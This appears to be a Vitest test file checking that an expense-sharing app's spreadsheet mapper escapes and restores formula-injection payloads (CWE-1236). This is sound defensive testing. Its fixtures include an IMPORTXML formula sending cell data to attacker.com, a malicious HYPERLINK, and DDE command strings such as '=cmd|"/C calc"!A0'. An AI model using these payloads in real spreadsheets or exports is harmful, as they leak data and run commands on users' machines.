import { describe, it, expect } from 'vitest';
import { SheetDataMapper, DEFAULT_EXPENSE_MAP, DEFAULT_SETTLEMENT_MAP, DEFAULT_MEMBER_MAP } from '../../src/infrastructure/SheetDataMapper';
import { Expense, Settlement, Member } from '../../src/domain/models';

describe('SheetDataMapper Security: Formula / CSV Injection Mitigation (CWE-1236)', () => {
    it('sanitizes dangerous formula trigger characters (=, +, -, @, \\t, \\r) in expense fields when mapping to sheet row', () => {
        const dangerousExpense: Expense = {
            id: 'exp-1',
            date: new Date('2026-10-16T12:00:00Z'),
            description: '=IMPORTXML("https://attacker.com/leak?d="&A1, "//a")',
            amount: 50,
            paidByUserId: '+user-attacker',
            category: '@Leisure',
            splits: [{ userId: 'u1', amount: 50 }],
            createdAt: new Date('2026-10-16T12:00:00Z'),
            updatedAt: new Date('2026-10-16T12:00:00Z')
        };

        const row = SheetDataMapper.mapFromExpense(dangerousExpense, DEFAULT_EXPENSE_MAP);
        
        // Ensure values starting with =, +, -, @ are escaped with leading single-quote
        expect(row[DEFAULT_EXPENSE_MAP.description]).toBe(`'=IMPORTXML("https://attacker.com/leak?d="&A1, "//a")`);
        expect(row[DEFAULT_EXPENSE_MAP.paidBy]).toBe(`'+user-attacker`);
        expect(row[DEFAULT_EXPENSE_MAP.category]).toBe(`'@Leisure`);
        // Amount is a number, not escaped
        expect(row[DEFAULT_EXPENSE_MAP.amount]).toBe(50);
    });

    it('unescapes sanitized formula prefixes when reading back from sheet row in mapToExpense', () => {
        const rawRow = [
            'exp-1',
            '2026-10-16T12:00:00.000Z',
            `'=IMPORTXML("https://attacker.com/leak?d="&A1, "//a")`,
            '50',
            `'+user-attacker`,
            `'@Leisure`,
            JSON.stringify([{ userId: 'u1', amount: 50 }]),
            JSON.stringify({ createdAt: '2026-10-16T12:00:00.000Z', lastModified: '2026-10-16T12:00:00.000Z' })
        ];

        const mapped = SheetDataMapper.mapToExpense(rawRow, 2, DEFAULT_EXPENSE_MAP);
        expect(mapped.entity.description).toBe('=IMPORTXML("https://attacker.com/leak?d="&A1, "//a")');
        expect(mapped.entity.paidByUserId).toBe('+user-attacker');
        expect(mapped.entity.category).toBe('@Leisure');
    });

    it('sanitizes and restores formula injection characters in settlement notes and methods', () => {
        const settlement: Settlement = {
            id: 'set-1',
            date: new Date('2026-10-16T12:00:00Z'),
            fromUserId: 'u1',
            toUserId: 'u2',
            amount: 25,
            method: '=HYPERLINK("https://malicious.com", "Click")',
            notes: '-2+5+cmd|calc',
            updatedAt: new Date('2026-10-16T12:00:00Z')
        };

        const row = SheetDataMapper.mapFromSettlement(settlement, DEFAULT_SETTLEMENT_MAP);
        expect(row[DEFAULT_SETTLEMENT_MAP.method]).toBe(`'=HYPERLINK("https://malicious.com", "Click")`);
        expect(row[DEFAULT_SETTLEMENT_MAP.notes]).toBe(`'-2+5+cmd|calc`);

        const restored = SheetDataMapper.mapToSettlement(row, 2, DEFAULT_SETTLEMENT_MAP);
        expect(restored.entity.method).toBe('=HYPERLINK("https://malicious.com", "Click")');
        expect(restored.entity.notes).toBe('-2+5+cmd|calc');
    });

    it('sanitizes and restores formula injection characters in member names and emails', () => {
        const member: Member = {
            userId: 'm-1',
            email: '+attacker@example.com',
            name: '=cmd|"/C calc"!A0',
            role: 'member',
            joinedAt: new Date('2026-10-16T12:00:00Z'),
            updatedAt: new Date('2026-10-16T12:00:00Z')
        };

        const row = SheetDataMapper.mapFromMember(member, DEFAULT_MEMBER_MAP);
        expect(row[DEFAULT_MEMBER_MAP.email]).toBe(`'+attacker@example.com`);
        expect(row[DEFAULT_MEMBER_MAP.name]).toBe(`'=cmd|"/C calc"!A0`);

        const restored = SheetDataMapper.mapToMember(row, 2, DEFAULT_MEMBER_MAP);
        expect(restored.entity.email).toBe('+attacker@example.com');
        expect(restored.entity.name).toBe('=cmd|"/C calc"!A0');
    });
});
